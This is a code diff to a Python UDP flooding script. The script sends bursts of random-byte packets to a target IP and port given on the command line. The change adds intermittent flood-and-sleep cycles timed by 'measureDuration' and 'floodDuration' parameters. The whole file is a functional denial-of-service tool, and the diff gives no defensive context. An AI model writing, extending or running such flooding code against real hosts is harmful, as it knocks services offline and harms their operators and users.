@@ -8,15 +8,15 @@ import sys
 ip = str(sys.argv[1])
 port = int(sys.argv[2])
 packet_size = int(sys.argv[3])
-duration = int(sys.argv[4])
+measureDuration = int(sys.argv[4])
+floodDuration = int(sys.argv[5])
 
-def run():
+def flood(partial_duration):
     data = random._urandom(packet_size)
-    i = random.choice(("[*]","[!]","[#]"))
     startTime = time.time()
     i = 0
     while True:
-        if time.time() > startTime + duration:
+        if time.time() > startTime + partial_duration:
             break
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -25,6 +25,12 @@ def run():
             i += 1
         except:
             print("[!] Error!!!")
-    print("sent " + str(i) + " packets in " + str(time.time() - startTime) + " seconds")
-    sys.stdout.flush()
+            sys.stdout.flush()
+
+def run():
+    runs = int((measureDuration/floodDuration)/2)
+    for x in range(runs):
+        time.sleep(floodDuration)
+        flood(floodDuration)
+
 run()
